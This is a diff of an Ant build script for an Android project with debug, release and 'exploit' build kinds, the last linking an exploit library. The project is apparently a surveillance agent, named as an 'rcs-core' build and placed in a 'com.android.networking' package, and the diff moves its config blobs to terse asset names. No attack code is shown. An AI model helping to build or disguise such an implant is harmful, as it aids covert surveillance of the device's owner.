@@ -35,6 +35,7 @@
 	<property name="ruby.path" value="C:/Ruby193/bin" />
 	<property name="rcscore.path" value="C:/HT/rcs-core-build" />
     
+<!-- 
 	<property name="out.dir" value="bin" />
 	<property name="out.classes.absolute.dir" location="${out.dir}/classes" />
 
@@ -42,6 +43,7 @@
 	<target name="release"    depends="-set-release-mode, -release-prompt-for-password, -package, -post-package, -post-build" />
 	<target name="debug"      depends="-set-debug-mode, -set-debug-files, -package, -post-package, -post-build" />
 	<target name="instrument" depends="-set-instrumented-mode, debug" />
+ -->
 	
 	<import file="${sdk.dir}/tools/ant/build.xml" />
 
@@ -132,27 +134,30 @@
 			<echo message="osversion: @{osversion}" />
 			<echo message="kind: @{kind}" />
 
+			<delete file="res/raw/config.bin" />
+			<delete file="res/raw/resources.bin" />
+			
 			<switch value="@{kind}">
 				<case value="debug">
 					<echo message="set debug" />
 					<antcall target="libsnoexp" />
 					<var name="isdebug" value="true" />
 					<var name="isexploit" value="false" />
-					<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin" overwrite="true" />
+					<copy file="preprocess/config.debug.bin" toFile="assets/c.bin" overwrite="true" />
 				</case>
 				<case value="release">
 					<echo message="set release" />
 					<antcall target="libsnoexp" />
 					<var name="isdebug" value="false" />
 					<var name="isexploit" value="false" />
-					<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
+					<copy file="preprocess/config.release.bin" toFile="assets/c.bin" overwrite="true" />
 				</case>
 				<case value="exploit">
 					<echo message="set exploit" />
 					<antcall target="libsexp" />
 					<var name="isdebug" value="false" />
 					<var name="isexploit" value="true" />
-					<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
+					<copy file="preprocess/config.release.bin" toFile="assets/c.bin" overwrite="true" />
 				</case>
 			</switch>
 
@@ -183,7 +188,7 @@
 			<delete file="assets/statusdb" />
 
 			<echo message="copy resources and Cfg" />
-			<copy file="preprocess/resources.bin" toFile="res/raw/resources.bin" overwrite="true" />
+			<copy file="preprocess/resources.bin" toFile="assets/r.bin" overwrite="true" />
 			<copy file="preprocess/Cfg.java" toFile="src/com/android/networking/auto/Cfg.java" overwrite="true">
 				<filterset>
 					<filter token="BUILD_ID" value="${build.number}" />
